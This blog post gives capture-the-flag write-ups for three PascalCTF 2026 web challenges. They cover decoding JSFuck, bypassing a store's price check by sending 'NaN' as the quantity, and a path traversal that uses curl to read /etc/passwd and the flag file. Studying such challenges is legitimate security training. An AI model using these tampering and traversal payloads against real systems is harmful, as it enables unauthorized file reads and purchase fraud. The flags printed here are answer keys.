---
layout: post
title:  "Pascal 2026 Web Challenges"
date:   2026-02-01 09:13:10 -0400
author: robo.uzi
tags: [CTF]
permalink: /pascalctf-2026-web-challenges/
---
* TOC
{:toc}

### JSHit

**Category**: Web

**Author**: Alan Davide Bovo `@AlBovo`

**Description**: I hate Javascript sooo much, maybe I'll write a website in PHP next time🔥!
[https://jshit.ctf.pascalctf.it](https://jshit.ctf.pascalctf.it)

I go the site and look at the source code. There is a script in `JSFuck` on the page. I go to [https://www.dcode.fr/jsfuck-language](https://www.dcode.fr/jsfuck-language) and decode it. It decodes to this:
```javascript
() => {const pageElement = document.getElementById('page'); const flag = document.cookie.split('; ').find(row => row.startsWith('flag=')); const pageContent = `<div class="container"><h1 class="mt-5">Welcome to JSHit</h1><p class="lead">${flag && flag.split('=')[1] === 'pascalCTF{1_h4t3_j4v4scr1pt_s0o0o0o0_much}' ? 'You got the flag gg' : 'You got no flag yet lol'}</p></div>`; pageElement.innerHTML = pageContent; console.log("where's the page gone?"); document.getElementById('code').remove();}
```

`pascalCTF{1_h4t3_j4v4scr1pt_s0o0o0o0_much}`

___

### ZazaStore

**Category**: Web

**Author**: Enea Maroncelli `@ZazaMan`, Alan Davide Bovo `@AlBovo`

**Description**: We dont take any responsibility in any damage that our product may cause to the user's health. [https://zazastore.ctf.pascalctf.it](https://zazastore.ctf.pascalctf.it)

Going to `https://zazastore.ctf.pascalctf.it/` I get a login page. I can login with anything, for example `test:test`. 

Once logged in I see I get $100. The "Real Za" when successfully purchased gives you the flag. It is $1000:

![Alt text](/images/ZazaStore1.png)

I add the "Real Za" to my cart and intercept the request with burpsuite. The request originally looks like this:
```http
POST /add-cart HTTP/1.1
Host: zazastore.ctf.pascalctf.it
Cookie: connect.sid=s%3A0qPxpobQg4DBvPUlGHa5uD6wV4RlK91B.NZvQmC58OZJowWQ7roI6QZFkpAk0Hj2S3VUQEZYJWHc
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://zazastore.ctf.pascalctf.it/
Content-Type: application/json
Content-Length: 33
Origin: https://zazastore.ctf.pascalctf.it
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{"product":"RealZa","quantity":1}
```
I change the `quantity` to contain this: `{"product":"RealZa","quantity":"NaN"}` and forward the request.

Once this is done and I go to `/cart`, then `/checkout` and the total for the product becomes `null`:
```http
POST /checkout HTTP/1.1
Host: zazastore.ctf.pascalctf.it
Cookie: connect.sid=s%3A0qPxpobQg4DBvPUlGHa5uD6wV4RlK91B.NZvQmC58OZJowWQ7roI6QZFkpAk0Hj2S3VUQEZYJWHc
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://zazastore.ctf.pascalctf.it/cart
Content-Type: application/json
Content-Length: 14
Origin: https://zazastore.ctf.pascalctf.it
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{"total":null}
```

This allows you to purchase the $1000 product despite being given only $100:

![Alt text](/images/ZazaStore2.png)

Going to `/inventory` after the purchase gives you the flag.

This is allowed because in `server.js`, `quantity` comes directly from user input and is never cast to a number.

`pascalCTF{w3_l1v3_f0r_th3_z4z4}`

___

### Travel Playlist

**Category**: Web

**Author**: Alan Davide Bovo `@AlBovo`

**Description**: Nel mezzo del cammin di nostra vita
mi ritrovai per una selva oscura, 
ché la diritta via era smarrita.
The flag can be found here `/app/flag.txt`. [https://travel.ctf.pascalctf.it](https://travel.ctf.pascalctf.it)

When I visit the site I see you can enter a page from `1-7` to load certain songs from YouTube. For example if I visit song 2 and make this request:
```http
GET /pages/2 HTTP/1.1
Host: travel.ctf.pascalctf.it
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
```

It also makes this api request:
```http
POST /api/get_json HTTP/1.1
Host: travel.ctf.pascalctf.it
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://travel.ctf.pascalctf.it/pages/2
Content-Type: application/json
Content-Length: 11
Origin: https://travel.ctf.pascalctf.it
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
Connection: keep-alive

{"index":2}
```

On `view-source:https://travel.ctf.pascalctf.it/` I see this script:
```javascript
document.getElementById('page-form').addEventListener('submit', function(event) {
    event.preventDefault();
    const pageNumber = document.getElementById('page-number').value;
    if (pageNumber) {
        window.location.href = `/pages/${pageNumber}`;
    }
});
```

So the `/pages/<n>` endpoint only renders the template. The actual song data is fetched from `/api/get_json`, which receives the `index` value directly from the client. The backend assumes that `index` is a numeric identifier and uses it to load a JSON file without sanitization.

I made this request out of curiousity:
```shell
curl -X POST https://travel.ctf.pascalctf.it/api/get_json -H "Content-Type: application/json" -d '{"index":"../../../../etc/passwd"}'  
root:x:0:0:root:/root:/bin/sh  
bin:x:1:1:bin:/bin:/sbin/nologin  
daemon:x:2:2:daemon:/sbin:/sbin/nologin  
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin  
sync:x:5:0:sync:/sbin:/bin/sync  
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown  
halt:x:7:0:halt:/sbin:/sbin/halt  
mail:x:8:12:mail:/var/mail:/sbin/nologin  
news:x:9:13:news:/usr/lib/news:/sbin/nologin  
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin  
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin  
ftp:x:21:21::/var/lib/ftp:/sbin/nologin  
sshd:x:22:22:sshd:/dev/null:/sbin/nologin  
games:x:35:35:games:/usr/games:/sbin/nologin  
ntp:x:123:123:NTP:/var/empty:/sbin/nologin  
guest:x:405:100:guest:/dev/null:/sbin/nologin  
nobody:x:65534:65534:nobody:/:/sbin/nologin  
challenge:x:1000:1000::/home/challenge:/bin/sh
```
It works!

I make this request to get the flag:
```shell
curl -X POST https://travel.ctf.pascalctf.it/api/get_json -H "Content-Type: application/json" -d '{"index":"../flag.txt"}'  
pascalCTF{4ll_1_d0_1s_tr4v3ll1nG_4r0und_th3_w0rld}
```

`pascalCTF{4ll_1_d0_1s_tr4v3ll1nG_4r0und_th3_w0rld}`

___
